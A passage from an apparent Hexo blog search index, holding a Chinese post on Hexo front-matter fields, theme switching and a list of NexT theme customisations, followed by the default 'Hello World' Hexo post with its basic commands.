默认可以使用的Front-matter： 参数 描述 默认值 layout 布局 title 标题 date 建立日期 文件建立日期 updated 更新日期 文件更新日期 comments 开启文章的评论功能 true tags 标签（不适用于分页） categories 分类（不适用于分页） permalink 覆盖文章网址 主题配置hexo主题wiki 可以在此处寻找自己喜欢的主题下载所有的主题文件，保存到Hexo目录下的themes文件夹下。然后在_config.yml文件中修改： 1234# Extensions## Plugins: http://hexo.io/plugins/## Themes: http://hexo.io/themes/theme: landscape //themes文件夹中对应文件夹的名称 然后先执行hexo clean，然后重新hexo g，并且hexo d，很快就能看到新主题的效果了~ 主题优化 设置「RSS」 添加「标签」页面 添加「分类」页面 设置「字体」 设置「代码高亮主题」 侧边栏社交链接 问题：图标哪里找？ 解决：Font Awesome 开启打赏功能 问题：微信支付宝二维码不美观，规格不一。 解决：在线生成二维码 设置友情链接 添加个人联系方式 腾讯公益404页面 站点建立时间 订阅微信公众号 设置「动画效果」 问题：慢，需要等待 JavaScript 脚本完全加载完毕后才会显示内容。 解决：将主题配置文件_config.yml中，use_motion字段的值设为 false 来关闭动画。 设置「背景动画」 添加背景图 修改Logo字体 修改内容区域的宽度 网站标题栏背景颜色 自定义鼠标样式 文章加密访问 实现点击出现桃心效果 静态资源压缩（博文压缩） 修改访问url路径 博文置顶 在右上角或左上角实现fork me on github 主页文章添加边框阴影效果 显示当前浏览记录 常见分类页 加入广告 添加萌萌哒 搜索功能 网易云外链播放器 花里胡哨的玩意儿 修改作者头像并旋转 修改代码块自定义样式 点击爆炸效果 添加萌妹子动图 侧栏设置 透明背景设置 添加阅读全文 设置网站缩略图标 添加站点访问计数 前几个可参考next官方文档配置 （以下用到外部工具） 评论系统 数据统计与分析 内容分享服务 文章加密访问 hexo-blog-encrypt SEOHexo NexT 主题SEO优化指南 seo这东西是使自己的文章能被百度、谷歌搜录，能被搜索到。 因为暂时不想被搜到/doge，所有暂不配置]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F05%2F13%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
